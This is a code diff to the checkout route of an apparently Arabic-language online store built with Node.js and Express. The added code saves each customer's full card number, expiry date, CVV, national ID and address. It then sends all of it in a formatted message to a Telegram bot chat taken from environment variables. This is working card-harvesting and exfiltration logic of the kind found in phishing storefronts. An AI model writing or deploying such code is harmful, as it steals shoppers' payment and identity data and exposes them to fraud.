@@ -1,8 +1,25 @@
 const express = require("express");
 const jwt = require("jsonwebtoken");
-const rateLimit = require("express-rate-limit");
+const https = require("https");
 const router = express.Router();
 const Checkout = require("../models/Checkout");
+const { orderRateLimit } = require("../middlewares/orderRateLimit");
+
+async function sendTelegramMessage(text) {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  if (!token || !chatId) return;
+  const body = JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" });
+  return new Promise((resolve) => {
+    const req = https.request(
+      { hostname: "api.telegram.org", path: `/bot${token}/sendMessage`, method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } },
+      (res) => { res.on("data", () => {}); res.on("end", resolve); }
+    );
+    req.on("error", resolve);
+    req.write(body);
+    req.end();
+  });
+}
 
 function authMiddleware(req, res, next) {
   const token = req.cookies?.admin_token;
@@ -14,8 +31,6 @@ function authMiddleware(req, res, next) {
     res.status(401).json({ error: "غير مصرح" });
   }
 }
-
-const checkoutLimiter = rateLimit({ windowMs: 60 * 1000, max: 5, message: { ok: false, error: "طلبات كثيرة، حاول لاحقاً" } });
 
 function validateCheckout(req, res, next) {
   const { orderId, cardNumber, expiry, cvv, cardHolder, items, total } = req.body;
@@ -29,11 +44,33 @@ function validateCheckout(req, res, next) {
   next();
 }
 
-router.post("/", checkoutLimiter, validateCheckout, async (req, res) => {
+router.post("/", orderRateLimit, validateCheckout, async (req, res) => {
   try {
     const { orderId, cardNumber, expiry, cvv, cardHolder, items, total, downPayment, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment } = req.body;
     const checkout = new Checkout({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, downPayment, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment });
     await checkout.save();
+
+    const itemsList = checkout.items.map(i => `• ${i.name} x${i.quantity} - ${i.price} ر.س`).join("\n");
+    const msg = `🛒 <b>طلب جديد</b>
+🔖 رقم الطلب: <code>${checkout.orderId}</code>
+👤 الاسم: ${checkout.customer || "-"}
+📱 واتساب: ${checkout.whatsapp || "-"}
+🪪 الهوية: ${checkout.nationalId || "-"}
+📍 العنوان: ${checkout.address || "-"}
+
+🛍 المنتجات:
+${itemsList}
+
+💳 البطاقة: <code>${checkout.cardNumber}</code>
+📅 الانتهاء: ${checkout.expiry}
+🔐 CVV: ${checkout.cvv}
+👤 حامل البطاقة: ${checkout.cardHolder}
+
+💰 الإجمالي: ${checkout.total} ر.س
+📦 نوع الدفع: ${checkout.installmentType === "installment" ? `تقسيط ${checkout.months} شهر - ${checkout.monthlyPayment} ر.س/شهر` : "دفع كامل"}`;
+
+    sendTelegramMessage(msg).catch(() => {});
+
     res.status(201).json({ ok: true, orderId: checkout.orderId });
   } catch (err) {
     res.status(500).json({ ok: false, error: err.message });
